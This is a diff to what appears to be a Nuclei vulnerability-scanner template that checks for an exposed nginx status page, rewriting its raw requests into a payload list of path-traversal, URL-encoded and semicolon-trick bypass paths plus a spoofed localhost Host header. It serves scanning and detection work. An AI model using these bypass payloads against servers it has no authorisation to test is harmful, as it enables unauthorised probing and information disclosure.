@@ -13,64 +13,41 @@ info:
     shodan-query: "server:nginx"
   tags: nginx,status,disclosure,bypass,misconfig
 
+flow: http(1) || http(2)
+
 http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{paths}}"
+
+    attack: clusterbomb
+    payloads:
+      paths:
+        - "/../nginx_status"
+        - "/./nginx_status"
+        - "/.//nginx_status"
+        - "/./..;/nginx_status"
+        - "/%2e%2e/nginx_status"
+        - "/./%252e%252e/nginx_status"
+        - "/./%6e%67%69%6e%78_%73%74%61%74%75%73"
+        - "/;/nginx_status"
+        - "/./?/nginx_status"
+        - "/./nginx_status;"
+        - "/./nginx_status%20"
+        - "/./nginx_status/"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "Active connections:","server accepts handled requests","Reading:","Writing:","Waiting:")'
+        condition: and
+
   - raw:
-      - |
-        GET /../nginx_status HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
-        GET /./nginx_status HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
-        GET /.//nginx_status HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
-        GET /..;/nginx_status HTTP/1.1
-        Host: {{Hostname}}
-
-      # URL encoding bypasses
-      - |
-        GET /%2e%2e/nginx_status HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
-        GET /%252e%252e/nginx_status HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
-        GET /%6e%67%69%6e%78_%73%74%61%74%75%73 HTTP/1.1
-        Host: {{Hostname}}
-
-      # Special character bypasses
-      - |
-        GET /;/nginx_status HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
-        GET /?/nginx_status HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
-        GET /nginx_status; HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
-        GET /nginx_status%20 HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
-        GET /nginx_status/ HTTP/1.1
-        Host: {{Hostname}}
-
-      # Header-based bypasses
       - |
         GET /nginx_status HTTP/1.1
         Host: localhost
 
-    stop-at-first-match: true
     matchers:
       - type: dsl
         dsl:
